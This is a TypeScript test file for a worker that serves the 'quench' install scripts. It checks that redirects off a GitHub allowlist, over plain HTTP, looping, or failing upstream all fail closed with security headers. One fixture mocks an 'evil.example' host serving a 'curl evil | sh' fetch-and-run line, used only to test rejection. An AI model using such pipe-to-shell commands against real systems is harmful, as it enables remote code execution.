import { afterEach, expect, test } from "bun:test";
import worker from "../site/worker.ts";

const latest = "https://github.com/JarenKempton/quench/releases/latest/download";
const tagged = "https://github.com/JarenKempton/quench/releases/download/v0.1.0";
const asset = "https://release-assets.githubusercontent.com/asset?sig=1";
const real = globalThis.fetch;
const requested: string[] = [];

const upstream = (routes: Record<string, () => Response>) => {
  requested.length = 0;
  globalThis.fetch = (async (input: string | URL | Request) => {
    const url = input instanceof Request ? input.url : input.toString();
    requested.push(url);
    return routes[url]?.() ?? new Response("not mocked", { status: 404 });
  }) as typeof fetch;
};
const redirect = (location: string) => () =>
  new Response(null, { status: 302, headers: { location } });
const assets = {
  fetch: async (request: Request) =>
    new Response(`asset ${new URL(request.url).pathname}`, {
      headers: { "content-type": "text/html" },
    }),
};
const get = (url: string) => worker.fetch(new Request(url), { ASSETS: assets });
const secure = (response: Response) => {
  expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  expect(response.headers.get("strict-transport-security")).toBe("max-age=31536000");
};
const failed = async (response: Response, body: string) => {
  expect(response.status).toBe(502);
  expect(response.headers.get("cache-control")).toBe("no-store");
  expect(await response.text()).toBe(body);
  secure(response);
};
const shFailure = 'echo "quench install: download failed" >&2; exit 1\n';
const psFailure = 'throw "quench install: download failed"\n';

afterEach(() => {
  globalThis.fetch = real;
});

test("an allowlisted multi-hop redirect serves the script as text/plain", async () => {
  upstream({
    [`${latest}/install.sh`]: redirect(`${tagged}/install.sh`),
    [`${tagged}/install.sh`]: redirect(asset),
    [asset]: () => new Response("#!/bin/sh\n"),
  });
  const response = await get("https://quench.sh/install.sh");
  expect(response.status).toBe(200);
  expect(response.headers.get("content-type")).toBe("text/plain; charset=utf-8");
  expect(response.headers.get("cache-control")).toBe("public, max-age=300");
  expect(await response.text()).toBe("#!/bin/sh\n");
  expect(requested).toEqual([`${latest}/install.sh`, `${tagged}/install.sh`, asset]);
  secure(response);
});

test("a redirect off the allowlist fails closed without being fetched", async () => {
  upstream({
    [`${latest}/install.sh`]: redirect("https://evil.example/install.sh"),
    "https://evil.example/install.sh": () => new Response("curl evil | sh\n"),
  });
  await failed(await get("https://quench.sh/install.sh"), shFailure);
  expect(requested).toEqual([`${latest}/install.sh`]);
});

test("a plain-http or non-default-port redirect fails closed", async () => {
  for (const location of ["http://github.com/x", "https://github.com:8443/x"]) {
    upstream({ [`${latest}/install.ps1`]: redirect(location) });
    await failed(await get("https://quench.sh/install.ps1"), psFailure);
    expect(requested).toEqual([`${latest}/install.ps1`]);
  }
});

test("an unparseable redirect location fails closed", async () => {
  upstream({ [`${latest}/install.sh`]: redirect("https://[invalid") });
  await failed(await get("https://quench.sh/install.sh"), shFailure);
});

test("a rejected upstream fetch fails closed", async () => {
  globalThis.fetch = (async () => {
    throw new TypeError("network down");
  }) as unknown as typeof fetch;
  await failed(await get("https://quench.sh/install.ps1"), psFailure);
});

test("an upstream body that errors mid-stream fails closed", async () => {
  const broken = () =>
    new Response(
      new ReadableStream({
        start(controller) {
          controller.enqueue(new TextEncoder().encode("#!/bin/sh\necho partial\n"));
          controller.error(new Error("connection reset"));
        },
      }),
    );
  upstream({ [`${latest}/install.sh`]: broken, [`${latest}/install.ps1`]: broken });
  await failed(await get("https://quench.sh/install.sh"), shFailure);
  await failed(await get("https://quench.sh/install.ps1"), psFailure);
});

test("a rejected assets binding returns an uncached 500 with the security headers", async () => {
  const response = await worker.fetch(new Request("https://quench.sh/"), {
    ASSETS: {
      fetch: async () => {
        throw new Error("assets down");
      },
    },
  });
  expect(response.status).toBe(500);
  expect(response.headers.get("cache-control")).toBe("no-store");
  secure(response);
});

test("a redirect loop stops after five hops", async () => {
  upstream({ [`${latest}/install.sh`]: redirect(`${latest}/install.sh`) });
  await failed(await get("https://quench.sh/install.sh"), shFailure);
  expect(requested).toHaveLength(6);
});

for (const status of [204, 206, 404, 500])
  test(`an upstream ${status} becomes a 502 that fails in both shells`, async () => {
    const body = status === 204 ? null : "#!/bin/sh\necho partial";
    upstream({
      [`${latest}/install.sh`]: () => new Response(body, { status }),
      [`${latest}/install.ps1`]: () => new Response(body, { status }),
    });
    await failed(await get("https://quench.sh/install.sh"), shFailure);
    await failed(await get("https://quench.sh/install.ps1"), psFailure);
  });

test("static assets carry the security headers", async () => {
  const response = await get("https://quench.sh/");
  expect(await response.text()).toBe("asset /");
  secure(response);
});

test("www redirects to the https apex with the security headers", async () => {
  const response = await get("http://www.quench.sh/install.sh?x=1");
  expect(response.status).toBe(301);
  expect(response.headers.get("location")).toBe("https://quench.sh/install.sh?x=1");
  secure(response);
});
